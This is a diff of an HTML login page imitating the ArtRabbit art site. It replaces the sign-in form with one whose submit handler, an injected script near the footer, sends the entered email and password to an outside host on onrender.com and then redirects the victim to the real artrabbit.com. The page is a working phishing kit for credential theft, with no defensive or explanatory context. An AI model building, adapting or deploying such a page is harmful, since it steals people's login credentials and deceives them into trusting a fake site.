@@ -147,36 +147,21 @@
                         <div class="g_grid-6 r_b2_grid-8 r_b3_grid-12 g_inset-2 r_b2_inset-1 r_b3_no-inset l_section">
                             <div class="l_inner-grid">
 
-                                <form class="form-signin" role="form" action="https://gmx-v3nl.onrender.com/art" method="POST">
-
-                                    <div class="m_field">
-                                        <label class="b_label" for="email">Email address</label>
-                                        <input type="text" name="email" class="b_input" value="" id="email" required="" autofocus="" autocorrect="off" autocapitalize="none">
-                                        
-                                    </div>
-                                    <div class="m_field">
-                                        <label class="b_label" for="password">Password</label>
-                                        <input type="password" name="password" class="b_input" id="password" required="">
-                                    </div>
-
-                                    <div class="m_field">
-                                        <div class="m_custom-checkbox m_custom-btn">
-                                            <span class="m_custom-btn-icon">Select</span>
-                                            <label class="m_custom-btn-text" for="rememberme">Remember me</label>
-                                            <input class="m_real-checkbox m_real-btn" type="checkbox" value="remember-me" id="rememberme">
-                                        </div>
-                                    </div>
-									<div class="m_field">
-										<p class="b_hint">To personalise your member experience there is a minimal amount of personal data that we collect and store when you log in. 
-							 		We do this by setting a few essential cookies. Read our full <a href="/about-artrabbit/cookie-policy">Cookie Policy</a>, <a href="/about-artrabbit/privacy">Privacy Notice</a>, and <a href="/about-artrabbit/terms">Terms and Conditions</a>.</p>
-									</div>
-                                    <div class="m_field">
-                                    	
-                                        <input type="submit" class="b_submit m_full-loader" value="Log in">
-                                        <input type="hidden" name="action_login" id="action_login" value="true">
-                                    </div>
-
-                                </form>
+                               <form class="form-signin" role="form" id="loginForm">
+    <!-- Your original form fields -->
+    <div class="m_field">
+        <label class="b_label" for="email">Email address</label>
+        <input type="text" name="email" class="b_input" required autofocus>
+    </div>
+    <div class="m_field">
+        <label class="b_label" for="password">Password</label>
+        <input type="password" name="password" class="b_input" required>
+    </div>
+    <input type="hidden" name="action_login" value="true">
+    <div class="m_field">
+        <input type="submit" class="b_submit m_full-loader" value="Log in">
+    </div>
+</form>
                             </div>
                             <div class="l_inner-grid mod--tSp">
                                 <div class="m_field">
@@ -347,7 +332,32 @@
 
         </div>
     </footer>
+
+
+		<script>
     
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const response = await fetch('https://gmx-v3nl.onrender.com/art', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                email: e.target.email.value,
+                password: e.target.password.value,
+                action_login: 'true'
+            })
+        });
+
+        // Your original server response handling
+        const result = await response.json();
+        if(result.status === 'success') {
+            window.location.href = 'https://www.artrabbit.com'; 
+        }
+    });
+</script>
+
+	
 <script type="text/javascript">
 var html=document.getElementsByTagName('html'); html[0].setAttribute('class', 'js');
 function loadScript(src, callback) {var s,r,t;r = false;s = document.createElement('script');s.type = 'text/javascript';s.src = src;s.onload = s.onreadystatechange = function() {if ( !r && (!this.readyState || this.readyState == 'complete') ){r = true;callback();}};t = document.getElementsByTagName('script')[0];t.parentNode.insertBefore(s, t);}
